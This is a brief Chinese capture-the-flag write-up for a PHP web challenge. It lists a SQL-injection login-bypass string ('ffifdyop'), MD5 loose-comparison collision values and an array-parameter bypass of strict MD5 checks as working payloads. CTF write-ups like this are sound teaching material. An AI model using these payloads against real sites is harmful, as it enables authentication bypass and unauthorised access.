![img](./assets/wps308.jpg)

输入ffifdyop万能密码

 

![img](./assets/wps309.jpg) 

F12查看源码

![img](./assets/wps310.jpg) 

分析

get传参x和y

==

弱类型判断x和y的md5值

构造payload：

?x=QNKCDZO&y=240610708

得到

![img](./assets/wps311.jpg) 

分析源码

post传参wqh和dsy

===

数组绕过

构造payload：
wqh[]=1&dsy[]=2

![img](./assets/wps312.jpg) 

得到flag

 

 